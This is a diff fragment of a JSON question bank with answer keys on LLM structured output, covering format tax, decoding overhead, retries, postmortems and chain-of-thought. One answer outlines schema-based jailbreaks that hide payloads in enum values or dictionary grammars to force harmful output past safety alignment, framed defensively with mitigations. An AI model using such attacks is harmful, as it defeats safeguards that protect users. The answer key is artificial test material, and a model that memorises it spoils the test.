+      "id": "T07-structured-output-d5",
+      "module": "T07-structured-output",
+      "q": "You enable strict mode. Validity goes to 100%. Accuracy drops 6 points on your eval. What happened and what are the fixes, in order of effectiveness?",
+      "a": "The format tax: format restrictions measurably degrade reasoning, stricter formats worse; JSON is the worst common offender. Most of the loss is in the format-REQUESTING instructions in the prompt, not the decoder mask. Fixes: (1) free-text reasoning field inside the schema (constrained envelope, unconstrained thought); (2) two-pass \u2014 freeform generation then a cheap reformat call under the strict schema; (3) re-run the constrained-vs-unconstrained A/B per model \u2014 recent closed-weight models measured near tax-free, open-weight models still pay.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-structured-output-d6",
+      "module": "T07-structured-output",
+      "q": "Explain why constrained decoding overhead gets WORSE at high batch size, when GPU costs amortize.",
+      "a": "The model forward pass batches and amortizes on the GPU. The grammar engine does not: per-step automaton advancement and mask computation run per-sequence on the CPU, and sequences with different schemas/states don't vectorize. More batch = more GPU throughput = the CPU side becomes the bottleneck. Measured extreme: at batch 256 over 10,000-value choice sets, vLLM+XGrammar hit 7.5 req/s versus 219 req/s with precomputed trie masks \u2014 a 29x cardinality-wall gap. That asymmetry is why engine optimizations (context-independent precompute, vocab-independent stack classification) are all CPU-side.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-structured-output-d7",
+      "module": "T07-structured-output",
+      "q": "Design the retry policy for a structured extraction endpoint. Why is the cap 3, and what must each retry attempt contain that a naive implementation omits?",
+      "a": "Cap 3 (instructor's default): each retry is a full inference pass, and if the model hasn't fixed a NAMED, SPECIFIC error in 3 attempts it's a schema/prompt problem, not sampling luck \u2014 unbounded retries are a cost bomb (a model update that drops first-shot validity turns every request into 3-5 passes). Each retry must feed back the pydantic ValidationError as loc + msg (field path and the corrective action) and CHANGE something \u2014 identical re-ask at low temperature reproduces the same failure (same-error thrash). After the cap: field-level salvage of the last raw output, nulls, needs_review flag, human queue \u2014 never a 500 to the caller.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T07-structured-output-d8",
+      "module": "T07-structured-output",
+      "q": "Your product accepts customer-uploaded JSON Schemas for extraction. A security review asks what the risk is. What do you tell them, with numbers?",
+      "a": "Schemas are an input channel to the grammar compiler \u2014 the Constrained Decoding Attack class (CCS 2026). EnumAttack hides payloads in enum values; DictAttack decouples payload across a benign prompt and a dictionary-based grammar: 94.3-99.5% attack success rate on flagship models (gpt-5, gemini-2.5-pro, deepseek-r1, gpt-oss-120b), and still 75.8% against SOTA jailbreak guardrails \u2014 the grammar ENFORCES the payload into the output while the model completes the harmful intent, and internal safety alignment can't see the control plane. Mitigations: audit untrusted schemas like SQL \u2014 allowlist keywords, cap enum cardinality and pattern complexity, cap compile time (also a DoS vector: 10-60s compiles).",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T07-structured-output-d9",
+      "module": "T07-structured-output",
+      "q": "A provider updates their model snapshot and 8% of your structured calls start failing. Walk through the response and the prevention as a postmortem.",
+      "a": "Response: alert on first-attempt-validity delta from per-schema instrumentation (not user complaints); pin the previous snapshot immediately; triage failures into classes (fence-wrapping, field-dropping, enum-case drift, refusal-rate change \u2014 each has a different fix); fix the highest-frequency class in prompt/schema; canary the new model with validity as the rollback trigger, not CPU/5xx \u2014 a structured-output regression is invisible to infra metrics. Prevention: treat the schema as a versioned contract with a golden conformance suite run against candidate models BEFORE cutover (like contract-testing a new downstream service); avoid undocumented behaviors (implied field presence, informal ordering). Pinning is the incident response, not the posture \u2014 deprecation timelines end.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T07-structured-output-d10",
+      "module": "T07-structured-output",
+      "q": "Should chain-of-thought live inside the structured output? Give the decision framework, not a yes/no.",
+      "a": "Usually yes, as a free-text field \u2014 it's the standard format-tax mitigation (constrained envelope, unconstrained thought). Three caveats: (1) register effect \u2014 merely requesting JSON narrows which answers the model produces (modal share 41%->64%), so generate diversity-critical ideation unconstrained and structure it in a second pass; (2) cost \u2014 JSON-embedded CoT pays escaping/structure overhead on every reasoning token, so two-pass (freeform then reformat) is often cheaper; (3) security \u2014 a reasoning field is untrusted model-generated text your system stores or feeds to tools; treat it as injection surface. Routing: extraction tasks -> single-pass constrained, no CoT needed; quality-critical human-facing -> two-pass; latency-critical -> single-pass constrained and eat the measured tax on the few reasoning-heavy cases.",
       "difficulty": "staff"
     }
   ]
